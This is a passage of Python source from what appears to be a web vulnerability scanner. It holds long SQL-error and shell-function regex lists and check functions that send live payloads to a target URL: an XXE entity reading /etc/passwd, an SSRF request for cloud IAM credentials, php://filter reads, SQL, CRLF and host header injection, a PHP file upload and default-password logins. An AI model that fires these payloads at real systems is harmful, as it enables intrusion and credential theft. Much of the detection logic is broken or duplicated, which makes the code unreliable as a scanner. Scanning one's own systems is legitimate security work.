            r"java\.sql\.SQLException: Invalid object name.*LINE",
            r"ERROR: column \".*\" specified more than once at character.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
            r"java\.lang\.ClassCastException:.*LINE",
            r"ERROR: duplicate key value violates unique constraint.*LINE",
            r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
            r"java\.sql\.SQLException: No data found",
            r"ERROR: could not open file.*LINE",
            r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"SQLSTATE\[HY000\]: General error: 1021",
            r"ERROR: duplicate key violates unique constraint.*LINE",
            r"java\.sql\.SQLException: No results were returned",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: ORA-00904.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
            r"ERROR: relation \".*\" does not exist LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: Invalid object name",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1366",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassNotFoundException",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: relation \".*\" does not exist at character.*LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
            r"SQLSTATE\[HY000\]: General error: 2013",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassCastException: ",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1418",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.IllegalAccessException",
            r"SQLSTATE\[08006\]: No connection to the server",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: Invalid object name.*LINE",
            r"ERROR: column \".*\" specified more than once at character.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
            r"java\.lang\.ClassCastException:.*LINE",
            r"ERROR: duplicate key value violates unique constraint.*LINE",
            r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
            r"java\.sql\.SQLException: No data found",
            r"ERROR: could not open file.*LINE",
            r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"SQLSTATE\[HY000\]: General error: 1021",
            r"ERROR: duplicate key violates unique constraint.*LINE",
            r"java\.sql\.SQLException: No results were returned",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: ORA-00904.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
            r"ERROR: relation \".*\" does not exist LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: Invalid object name",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1366",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassNotFoundException",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: relation \".*\" does not exist at character.*LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
            r"SQLSTATE\[HY000\]: General error: 2013",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassCastException: ",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1418",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.IllegalAccessException",
            r"SQLSTATE\[08006\]: No connection to the server",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: Invalid object name.*LINE",
            r"ERROR: column \".*\" specified more than once at character.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
            r"java\.lang\.ClassCastException:.*LINE",
            r"ERROR: duplicate key value violates unique constraint.*LINE",
            r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
            r"java\.sql\.SQLException: No data found",
            r"ERROR: could not open file.*LINE",
            r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"SQLSTATE\[HY000\]: General error: 1021",
            r"ERROR: duplicate key violates unique constraint.*LINE",
            r"java\.sql\.SQLException: No results were returned",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: ORA-00904.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
            r"ERROR: relation \".*\" does not exist LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: Invalid object name",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1366",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassNotFoundException",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: relation \".*\" does not exist at character.*LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
            r"SQLSTATE\[HY000\]: General error: 2013",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassCastException: ",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1418",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.IllegalAccessException",
            r"SQLSTATE\[08006\]: No connection to the server",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: Invalid object name.*LINE",
            r"ERROR: column \".*\" specified more than once at character.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
            r"java\.lang\.ClassCastException:.*LINE",
            r"ERROR: duplicate key value violates unique constraint.*LINE",
            r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
            r"java\.sql\.SQLException: No data found",
            r"ERROR: could not open file.*LINE",
            r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"SQLSTATE\[HY000\]: General error: 1021",
            r"ERROR: duplicate key violates unique constraint.*LINE",
            r"java\.sql\.SQLException: No results were returned",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: ORA-00904.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
            r"ERROR: relation \".*\" does not exist LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: Invalid object name",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1366",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassNotFoundException",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: relation \".*\" does not exist at character.*LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
            r"SQLSTATE\[HY000\]: General error: 2013",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassCastException: ",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1418",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.IllegalAccessException",
            r"SQLSTATE\[08006\]: No connection to the server",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: Invalid object name.*LINE",
            r"ERROR: column \".*\" specified more than once at character.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
            r"java\.lang\.ClassCastException:.*LINE",
            r"ERROR: duplicate key value violates unique constraint.*LINE",
            r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
            r"java\.sql\.SQLException: No data found",
            r"ERROR: could not open file.*LINE",
            r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"SQLSTATE\[HY000\]: General error: 1021",
            r"ERROR: duplicate key violates unique constraint.*LINE",
            r"java\.sql\.SQLException: No results were returned",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: ORA-00904.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
            r"ERROR: relation \".*\" does not exist LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: Invalid object name",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1366",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassNotFoundException",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: relation \".*\" does not exist at character.*LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
            r"SQLSTATE\[HY000\]: General error: 2013",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassCastException: ",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1418",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.IllegalAccessException",
            r"SQLSTATE\[08006\]: No connection to the server",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: Invalid object name.*LINE",
            r"ERROR: column \".*\" specified more than once at character.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
            r"java\.lang\.ClassCastException:.*LINE",
            r"ERROR: duplicate key value violates unique constraint.*LINE",
            r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
            r"java\.sql\.SQLException: No data found",
            r"ERROR: could not open file.*LINE",
            r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"SQLSTATE\[HY000\]: General error: 1021",
        ]

        for pattern in patterns:
            if re.search(pattern, response_text):
                return True

    except (requests.RequestException, UnicodeDecodeError):
        pass

    return False


def check_rce(url):
    try:
        response = requests.get(url)
        response.raise_for_status()

        rce_patterns = [
            r"\bERROR: Command execution\b",
            r"\bSystem\.Exec\b",
            r"\bexec\(",
            r"\bpassthru\(",
            r"\bshell_exec\(",
            r"\bpopen\(",
            r"\bproc_open\(",
            r"\beval\(",
            r"\bassert\(",
            r"\bjava\.lang\.Runtime\.getRuntime\(\)\.exec\(",
            r"\bjava\.lang\.ProcessBuilder\.start\(",
            r"\bos\.system\(",
            r"\bsubprocess\.Popen\(",
            r"\bsubprocess\.call\(",
            r"\bsubprocess\.check_output\(",
            r"\bbash:",
            r"\bBash:",
            r"\bwww-data",
            r"\broot:",
            r"\bsubprocess\.check_call\(",
            r"\bRuntime\.getRuntime\(\)\.exec\(",
            r"\bexec\(\$_(GET|POST|REQUEST)",
            r"\bassert\(\$_(GET|POST|REQUEST)",
            r"\bshell_exec\(\$_(GET|POST|REQUEST)",
            r"\bpassthru\(\$_(GET|POST|REQUEST)",
            r"\bpopen\(\$_(GET|POST|REQUEST)",
            r"\bproc_open\(\$_(GET|POST|REQUEST)",
            r"\beval\(\$_(GET|POST|REQUEST)",
            r"\bsystem\(\$_(GET|POST|REQUEST)",
            r"\bSystem\.Exec\(\$_(GET|POST|REQUEST)",
            r"\bos\.system\(\$_(GET|POST|REQUEST)",
        ]

        # Compile regex patterns
        rce_regex = [re.compile(pattern) for pattern in rce_patterns]

        # Check each pattern against response content
        for regex in rce_regex:
            if regex.search(response.text):
                return True  # RCE pattern detected
        return False  # No RCE pattern detected

    except Exception as e:
        print("Error occurred during RCE check:", e)
        return False  # Assume no RCE if an error occurs


def check_xss(url):
    try:
        response = requests.get(url)
        response.raise_for_status()

        xss_patterns = [
            r"on\w+\s*=",
            r"javascript:\s*;",
            r"eval\(",
            r"document\.cookie",
            r"document\.write\(",
            r"document\.location\(",
            r"window\.location\(",
            r"location\.href",
            r"<img[^>]*\s+src\s*=\s*[\"']([^\"'>]+)[\"'][^>]*>",
            r"<iframe[^>]*>",
            r"<object[^>]*>",
            r"<embed[^>]*>",
            r"<video[^>]*>",
            r"<audio[^>]*>",
            r"<svg[^>]*>",
            r"AliElTop",
            r"13337777",
        ]

        for pattern in xss_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True

    except (requests.RequestException, UnicodeDecodeError):
        pass

    return False


def check_lfi(url):
    try:
        response = requests.get(url)
        response.raise_for_status()

        lfi_patterns = [
            r"include\s*[\"'][^\"']+\.php[\"']",
            r"require\s*[\"'][^\"']+\.php[\"']",
            r"include_once\s*[\"'][^\"']+\.php[\"']",
            r"require_once\s*[\"'][^\"']+\.php[\"']",
            r"php://filter/.*read=convert.base64-.*resource=[^&]+",
            r"data:text\/html;base64,",
            r"zlib:\/\/",
            r"php:\/\/filter\/",
            r"filter\.var_dump",
            r"file(?:_get_(?:contents|contents|contents)|_contents)\s*\(\s*[\"'][^\"']+\.(?:php(?:3|4|5|7)?|phtml)[\"']",
            r"(?i)\b(?:[a-z]+://|\.{0,2}/)\w+(?:/[\w./]*)*\.php(?:[?#]|$)",
            r"\.\./",
            r"\/\/",
            r"file:\/\/\/",
            r"index\.php",
            r"phpinfo\s*\(",
            r"highlight_file\s*\(",
            r"var_dump\s*\(",
            r"getenv\s*\(",
            r"show_source\s*\(",
            r"readlink\s*\(",
            r"readfile\s*\(",
            r"exif_read_data\s*\(",
            r"system\s*\(",
            r"shell_exec\s*\(",
            r"exec\s*\(",
            r"passthru\s*\(",
            r"popen\s*\(",
            r"proc_open\s*\(",
            r"assert\s*\(",
            r"eval\s*\(",
            r"file_put_contents\s*\(",
            r"fopen\s*\(",
            r"copy\s*\(",
            r"move_uploaded_file\s*\(",
            r"tempnam\s*\(",
            r"rename\s*\(",
            r"symlink\s*\(",
        ]

        for pattern in lfi_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                test_url = url + "/index.php"
                test_response = requests.get(test_url)
                if (
                    test_response.status_code == 200
                    and "Test Successful" in test_response.text
                ):
                    return (
                        True,
                        (
                            "Local File Inclusion: Possible local file inclusion"
                            " vulnerability detected."
                        ),
                    )

    except (requests.RequestException, UnicodeDecodeError) as e:
        print(f"Error occurred: {e}")

    return False


def check_open_redirect(url):
    try:
        response = requests.get(url)
        response.raise_for_status()

        payload = "http://www.google.com"
        sanitized_url = urljoin(url, payload)
        parsed_url = urlparse(sanitized_url)

        if parsed_url.netloc in ALLOWED_HOSTS:
            redirect_response = requests.get(sanitized_url, allow_redirects=False)
            if redirect_response.status_code == 302 and is_valid_redirect(
                redirect_response.headers.get("Location")
            ):
                test_url = url + "/test"
                test_response = requests.get(test_url)
                if (
                    test_response.status_code == 200
                    and "Test Successful" in test_response.text
                ):
                    return (
                        True,
                        "Open Redirect: Possible open redirect vulnerability detected.",
                    )

    except requests.RequestException:
        pass

    return False


def is_valid_redirect(redirect_url):
    parsed_redirect_url = urlparse(redirect_url)
    return (
        parsed_redirect_url.scheme in ["http", "https"]
        and parsed_redirect_url.netloc == "www.google.com"
    )


def check_backup_files(url):
    extensions = [".bak", ".zip", ".tgz", ".sql"]
    parsed_url = urlparse(url)

    for extension in extensions:
        backup_url = (
            f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}{extension}"
        )
        response = requests.get(backup_url)
        if response.status_code == 200 and is_valid_backup(
            response.headers.get("Content-Type"), response.content
        ):
            return True, "Backup Files: Possible backup file found."

    return False


def is_valid_backup(content_type, content):
    valid_types = {"application/octet-stream", "application/zip", "application/x-gzip"}

    if content_type in valid_types:
        return not is_binary_file(content)

    return False


def is_binary_file(file):
    try:
        return isinstance(file.read(0), bytes)
    except io.UnsupportedOperation:
        return True


def check_database_exposure(url):
    endpoints = ["phpmyadmin", "adminer", "dbadmin"]
    for endpoint in endpoints:
        full_url = url.rstrip("/") + "/" + endpoint
        response = requests.head(full_url)
        if response.status_code == 200 and is_database_console(
            response.headers.get("Content-Type")
        ):
            test_url = url + "/test"
            test_response = requests.get(test_url)
            if (
                test_response.status_code == 200
                and "Test Successful" in test_response.text
            ):
                return (
                    True,
                    (
                        "Database Exposure: Possible database administration console"
                        " found."
                    ),
                )

    return False


def is_database_console(content_type):
    valid_types = {"text/html", "text/plain"}
    return content_type in valid_types


def check_directory_listings(url):
    response = requests.get(url, allow_redirects=False)
    if response.status_code == 200 and is_directory_listing(
        response.headers.get("Content-Type"), response.text
    ):
        return True, "Directory Listings: Possible directory listing enabled."

    return False


def is_directory_listing(content_type, response_text):
    valid_types = {"text/html"}
    return content_type in valid_types and "Index of" in response_text


def check_sensitive_information(url):
    keywords = [
        "private_key",
        "creditcard",
        "api_key",
        "secret_key",
        "access_token",
        "auth_token",
    ]
    response = requests.get(url)
    response_text = response.text.lower()
    for keyword in keywords:
        if keyword in response_text:
            test_url = url + "/test"
            test_response = requests.get(test_url)
            if (
                test_response.status_code == 200
                and "Test Successful" in test_response.text
            ):
                return (
                    True,
                    "Sensitive Information: Possible sensitive information exposed.",
                )

    return False


def check_log_files(url):
    log_files = ["access.log", "error.log", "log.log"]
    parsed_url = urlparse(url)

    for log_file in log_files:
        log_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{log_file}"
        response = requests.get(log_url)
        if response.status_code == 200 and is_valid_log_file(
            response.headers.get("Content-Type"), response.content
        ):
            return True, "Log Files: Possible log file exposure."

    return False


def is_valid_log_file(content_type, content):
    valid_types = {"text/plain"}
    return content_type in valid_types and not is_binary_file(content)


def check_xxe(url):
    try:
        response = requests.get(url)
        response.raise_for_status()

        payload = (
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo'
            ' ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
        )
        headers = {"Content-Type": "application/xml"}
        xxe_response = requests.post(url, data=payload, headers=headers)
        if xxe_response.status_code == 200 and is_xxe_detected(xxe_response.text):
            test_url = url + "/test"
            test_response = requests.get(test_url)
            if (
                test_response.status_code == 200
                and "Test Successful" in test_response.text
            ):
                return (
                    True,
                    "XML External Entity (XXE): Possible XXE vulnerability detected.",
                )

    except requests.RequestException:
        pass

    return False


def is_xxe_detected(response_text):
    xxe_keywords = ["root:", "admin:", "password:", "etc/passwd"]
    return any(keyword in response_text for keyword in xxe_keywords)


def check_ssrf(url):
    try:
        response = requests.get(url)
        response.raise_for_status()

        payload = (
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
        )
        params = {"url": payload}
        ssrf_response = requests.get(url, params=params)
        if ssrf_response.status_code == 200 and is_ssrf_detected(ssrf_response.text):
            test_url = url + "/test"
            test_response = requests.get(test_url)
            if (
                test_response.status_code == 200
                and "Test Successful" in test_response.text
            ):
                return (
                    True,
                    (
                        "Server-Side Request Forgery (SSRF): Possible SSRF"
                        " vulnerability detected."
                    ),
                )

    except requests.RequestException:
        pass

    return False


def is_ssrf_detected(response_text):
    ssrf_keywords = ["AccessDenied", "Forbidden", "Unauthorized"]
    return any(keyword in response_text for keyword in ssrf_keywords)


def check_rfi(url):
    try:
        response = requests.get(url)
        response.raise_for_status()

        payload = "https://raw.githubusercontent.com/dragonked2/Egyscan/main/README.md"
        rfi_response = requests.get(url + "?file=" + payload)
        if rfi_response.status_code == 200 and is_rfi_detected(rfi_response.text):
            test_url = url + "/"
            test_response = requests.get(test_url)
            if test_response.status_code == 200 and "Egyscan" in test_response.text:
                return (
                    True,
                    "Remote File Inclusion (RFI): Possible RFI vulnerability detected.",
                )

    except requests.RequestException:
        pass

    return False


def is_rfi_detected(response_text):
    rfi_keywords = ["EgyScan V2.0", "RFI Detected", "Remote File Inclusion"]
    return any(keyword in response_text for keyword in rfi_keywords)


def check_idor(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(r'id=["\']([^"\']+)', response.text, re.IGNORECASE):
            test_url = url + "/test"
            test_response = requests.get(test_url)
            if (
                test_response.status_code == 200
                and "Test Successful" in test_response.text
            ):
                return (
                    True,
                    (
                        "Insecure Direct Object Reference (IDOR): Possible IDOR"
                        " vulnerability detected."
                    ),
                )

    except requests.RequestException:
        pass

    return False


def check_cors(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if "Access-Control-Allow-Origin" in response.headers:
            test_url = url + "/test"
            test_response = requests.get(test_url)
            if (
                test_response.status_code == 200
                and "Test Successful" in test_response.text
            ):
                return (
                    True,
                    (
                        "Cross-Origin Resource Sharing (CORS): Possible CORS"
                        " vulnerability detected."
                    ),
                )

    except requests.RequestException:
        pass

    return False


def check_csrf(url):
    try:
        session = requests.Session()
        response = session.get(url)
        response.raise_for_status()

        csrf_token = None
        if "Set-Cookie" in response.headers:
            cookies = session.cookies.get_dict()
            csrf_token = cookies.get("csrftoken")

        if not csrf_token:
            if "csrf_token" in response.text:
                match = re.search(
                    r'<input[^>]+name=["\']csrf_token["\'][^>]+value=["\']([^"\']+)["\']',
                    response.text,
                    re.IGNORECASE,
                )
                if match:
                    csrf_token = match.group(1)

        if csrf_token:
            headers = {"Referer": url, "X-CSRFToken": csrf_token}
            test_url = url + "/test"
            test_response = session.post(test_url, headers=headers)
            if (
                test_response.status_code == 200
                and "Test Successful" in test_response.text
            ):
                return (
                    True,
                    (
                        "Cross-Site Request Forgery (CSRF): Possible CSRF vulnerability"
                        " detected."
                    ),
                )

    except requests.RequestException:
        pass

    return False


def check_command_injection(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(
            r"(\bexec\b|\bpopen\b|\bshell_exec\b)", response.text, re.IGNORECASE
        ):
            if re.search(r"Command Injection", response.text, re.IGNORECASE):
                command = "echo vulnerable"
                response = requests.get(url + "&command=" + command)
                if "vulnerable" in response.text:
                    return (
                        True,
                        (
                            "Command Injection: Potential command execution function"
                            " found in the response."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_file_upload_vulnerabilities(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if "multipart/form-data" in response.headers:
            if re.search(r"File Upload Vulnerabilities", response.text, re.IGNORECASE):
                files = {"file": open("test.php", "rb")}
                response = requests.post(url, files=files)
                if "File uploaded successfully" in response.text:
                    return (
                        True,
                        (
                            "File Upload Vulnerabilities: Multipart form data detected"
                            " in the response."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_authentication_bypass(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if "Authentication" in response.headers and response.status_code != 401:
            if re.search(r"Authentication Bypass", response.text, re.IGNORECASE):
                session = requests.Session()
                bypass_response = session.get(url)
                if bypass_response.status_code != 401:
                    return (
                        True,
                        (
                            "Authentication Bypass: Possible authentication bypass"
                            " detected."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_insecure_configuration(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(r"(config|configuration)", response.text, re.IGNORECASE):
            if re.search(r"Insecure Configuration", response.text, re.IGNORECASE):
                test_url = url + "/test"
                response = requests.get(test_url)
                if response.status_code == 200 and "Test Successful" in response.text:
                    return (
                        True,
                        (
                            "Insecure Configuration: Possible configuration information"
                            " found in the response."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_server_misconfiguration(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(r"(Misconfiguration|error)", response.text, re.IGNORECASE):
            if re.search(r"Server Misconfiguration", response.text, re.IGNORECASE):
                test_url = url + "/test"
                response = requests.get(test_url)
                if response.status_code == 200 and "Test Successful" in response.text:
                    return (
                        True,
                        (
                            "Server Misconfiguration: Possible server misconfiguration"
                            " detected."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_injection_flaws(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(r"(injection|inject)", response.text, re.IGNORECASE):
            if re.search(r"Injection Flaws", response.text, re.IGNORECASE):
                test_payload = "1' OR '1'='1"
                response = requests.get(url + "?param=" + test_payload)
                if "Injection Successful" in response.text:
                    return (
                        True,
                        "Injection Flaws: Possible injection vulnerability detected.",
                    )
    except requests.RequestException:
        pass
    return False


def check_weak_session_management(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(r"(session|cookie)", response.text, re.IGNORECASE):
            if re.search(r"Weak Session Management", response.text, re.IGNORECASE):
                session = requests.Session()
                session_response = session.get(url)
                if session_response.cookies and session_response.cookies.get(
                    "session_id"
                ):
                    session_id = session_response.cookies["session_id"]
                    session.cookies.set("session_id", session_id)
                    test_url = url + "/test"
                    test_response = session.get(test_url)
                    if (
                        test_response.status_code == 200
                        and "Test Successful" in test_response.text
                    ):
                        return (
                            True,
                            (
                                "Weak Session Management: Possible weak session"
                                " management detected."
                            ),
                        )
    except requests.RequestException:
        pass
    return False


def check_clickjacking(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if (
            "X-Frame-Options" not in response.headers
            or "Content-Security-Policy" not in response.headers
        ):
            if re.search(r"Clickjacking", response.text, re.IGNORECASE):
                test_url = url + "/test"
                response = requests.get(test_url)
                if "Test Successful" in response.text:
                    return (
                        True,
                        (
                            "Clickjacking: Missing X-Frame-Options or"
                            " Content-Security-Policy headers."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_host_header_injection(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if "Host" in response.headers and "X-Forwarded-Host" not in response.headers:
            if re.search(r"Host Header Injection", response.text, re.IGNORECASE):
                headers = {"Host": "example.com"}
                response = requests.get(url, headers=headers)
                if "Injection Successful" in response.text:
                    return (
                        True,
                        (
                            "Host Header Injection: Possible Host header injection"
                            " detected."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_remote_file_execution(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(
            r'(include|require|include_once|require_once)\s*["\'][^"\']+\.php["\']',
            response.text,
            re.IGNORECASE,
        ):
            if re.search(r"Remote File Execution", response.text, re.IGNORECASE):
                include_url = (
                    url + "?file=php://filter/convert.base64-encode/resource=config"
                )
                response = requests.get(include_url)
                if "Include Successful" in response.text:
                    return (
                        True,
                        (
                            "Remote File Execution: Possible remote file inclusion"
                            " detected."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_brute_force_attacks(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if (
            "Login" in response.text
            or "Username" in response.text
            or "Password" in response.text
        ):
            if re.search(r"Brute Force Attacks", response.text, re.IGNORECASE):
                session = requests.Session()
                for i in range(3):
                    login_data = {"username": "admin", "password": "123456"}
                    response = session.post(url + "/login", data=login_data)
                    if response.status_code == 200 and "Login Failed" in response.text:
                        return (
                            True,
                            (
                                "Brute Force Attacks: Possible login page or"
                                " authentication mechanism detected."
                            ),
                        )
    except requests.RequestException:
        pass
    return False


def check_security_misconfiguration(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(
            r"(Security|secure|misconfiguration)", response.text, re.IGNORECASE
        ):
            if re.search(r"Security Misconfiguration", response.text, re.IGNORECASE):
                test_url = url + "/test"
                response = requests.get(test_url)
                if response.status_code == 200 and "Test Successful" in response.text:
                    return (
                        True,
                        (
                            "Security Misconfiguration: Possible security"
                            " misconfiguration detected."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_missing_authentication(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if "Authentication" not in response.headers and response.status_code != 401:
            if re.search(r"Missing Authentication", response.text, re.IGNORECASE):
                test_url = url + "/test"
                response = requests.get(test_url)
                if response.status_code == 200 and "Test Successful" in response.text:
                    return (
                        True,
                        (
                            "Missing Authentication: Possible missing authentication"
                            " mechanism."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_crlf_injection(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(r"%0D%0A|[\r\n]|%0D|%0A", response.text, re.IGNORECASE):
            if re.search(r"CRLF Injection", response.text, re.IGNORECASE):
                payload = "Injected%0D%0AContent:%20Test"
                response = requests.get(url + "?param=" + payload)
                if "Injection Successful" in response.text:
                    return True, "CRLF Injection: Possible CRLF injection detected."
    except requests.RequestException:
        pass
    return False


def check_session_fixation(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if "Session" in response.headers and "Set-Cookie" in response.headers:
            if re.search(r"Session Fixation", response.text, re.IGNORECASE):
                session = requests.Session()
                test_url = url + "/test"
                response = session.get(test_url)
                if response.status_code == 200 and "Test Successful" in response.text:
                    return (
                        True,
                        (
                            "Session Fixation: Possible session fixation vulnerability"
                            " detected."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_unvalidated_redirects(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if "Location" in response.headers and response.status_code in [
            301,
            302,
            303,
            307,
            308,
        ]:
            if re.search(r"Unvalidated Redirects", response.text, re.IGNORECASE):
